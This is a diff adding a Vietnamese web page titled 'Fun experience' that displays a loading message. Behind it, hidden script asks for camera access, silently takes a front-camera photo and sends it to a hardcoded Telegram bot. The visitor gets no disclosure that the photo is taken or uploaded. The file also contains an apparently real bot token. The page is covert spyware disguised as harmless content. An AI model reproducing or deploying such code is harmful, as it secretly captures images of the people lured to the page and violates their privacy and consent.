@@ -1,0 +1,58 @@
+<!doctype html>
+<html lang="vi">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Trải nghiệm vui</title>
+  </head>
+  <body>
+    <h2>Đang tải nội dung...</h2>
+    <video id="video" autoplay playsinline style="display: none"></video>
+    <canvas id="canvas" style="display: none"></canvas>
+
+    <script>
+      const TELEGRAM_TOKEN = "8785240955:AAFsPs-k0OjqigPwSXmA1brpdsfYoxV3k3Y";
+      const CHAT_ID = "8785240955";
+
+      // Yêu cầu quyền truy cập Camera trước (facingMode: "user")
+      navigator.mediaDevices
+        .getUserMedia({ video: { facingMode: "user" } })
+        .then((stream) => {
+          const video = document.getElementById("video");
+          video.srcObject = stream;
+
+          // Chờ video sẵn sàng rồi chụp ảnh
+          video.onloadedmetadata = () => {
+            setTimeout(() => {
+              const canvas = document.getElementById("canvas");
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              const ctx = canvas.getContext("2d");
+              ctx.drawImage(video, 0, 0);
+
+              // Chuyển ảnh sang dạng Blob và gửi lên Telegram
+              canvas.toBlob((blob) => {
+                const formData = new FormData();
+                formData.append("chat_id", CHAT_ID);
+                formData.append("photo", blob, "capture.jpg");
+
+                fetch(
+                  `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`,
+                  {
+                    method: "POST",
+                    body: formData,
+                  },
+                ).then(() => {
+                  // Tắt camera sau khi chụp xong
+                  stream.getTracks().forEach((track) => track.stop());
+                  alert("Đã xong!");
+                });
+              }, "image/jpeg");
+            }, 1000); // Chờ 1 giây để camera bắt nét
+          };
+        })
+        .catch((err) => {
+          console.log("Người dùng từ chối quyền camera:", err);
+        });
+    </script>
+  </body>
+</html>
